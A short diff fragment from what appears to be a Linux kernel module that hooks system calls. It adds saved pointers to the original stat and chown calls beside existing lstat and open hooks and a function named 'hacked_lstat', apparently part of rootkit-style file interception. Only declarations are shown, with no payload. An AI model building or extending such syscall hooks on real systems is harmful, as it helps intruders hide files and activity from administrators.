@@ -30,6 +30,11 @@ asmlinkage long (*orig_lstat)(const char __user *pathname, struct stat __user *b
 
 asmlinkage long (*orig_open)(const char __user *pathname, const int __user oflag, const mode_t __user mode);
 
+asmlinkage long (*orig_stat)(const char __user *pathname, const struct stat *buf);
+
+asmlinkage long (*orig_chown)(const char __user *pathname, const uid_t owner, const gid_t group); 
+
+
 //Define our hacked lstat
 asmlinkage int hacked_lstat(const char __user *pathname, struct stat __user *buf){
 	char *kern_buff = NULL;
